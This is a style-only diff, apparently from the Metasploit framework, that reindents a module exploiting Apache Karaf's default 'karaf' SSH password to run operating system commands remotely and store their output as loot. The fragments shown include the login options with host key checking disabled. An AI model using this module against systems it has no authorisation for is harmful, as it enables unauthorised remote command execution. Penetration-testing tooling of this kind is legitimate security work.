@@ -10,23 +10,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Apache Karaf Default Credentials Command Execution",
-      'Description'    => %q{
-        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
-        The 'karaf' user has a known default password, which can be used to login to the
-        SSH service, and execute operating system commands from remote.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Apache Karaf Default Credentials Command Execution",
+        'Description' => %q{
+          This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
+          The 'karaf' user has a known default password, which can be used to login to the
+          SSH service, and execute operating system commands from remote.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Nicholas Starke <nick@alephvoid.com>'
         ],
-      'Platform'       => 'unix',
-      'Arch'           => ARCH_CMD,
-      'Privileged'     => true,
-      'DisclosureDate' => '2016-02-09'))
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Privileged' => true,
+        'DisclosureDate' => '2016-02-09'
+      )
+    )
 
     register_options(
       [
@@ -65,12 +68,12 @@ class MetasploitModule < Msf::Auxiliary
   def do_login(user, pass, ip)
     factory = ssh_socket_factory
     opts = {
-      :auth_methods    => ['password'],
-      :port            => rport,
-      :config          => false,
-      :use_agent       => false,
-      :password        => pass,
-      :proxy           => factory,
+      :auth_methods => ['password'],
+      :port => rport,
+      :config => false,
+      :use_agent => false,
+      :password => pass,
+      :proxy => factory,
       :non_interactive => true,
       :verify_host_key => :never
     }
@@ -115,9 +118,9 @@ class MetasploitModule < Msf::Auxiliary
       if output
         print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
-                "text/plain",
-                ip,
-                output)
+                   "text/plain",
+                   ip,
+                   output)
         vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
       else
         print_error "#{ip}:#{rport} - Command failed to execute"
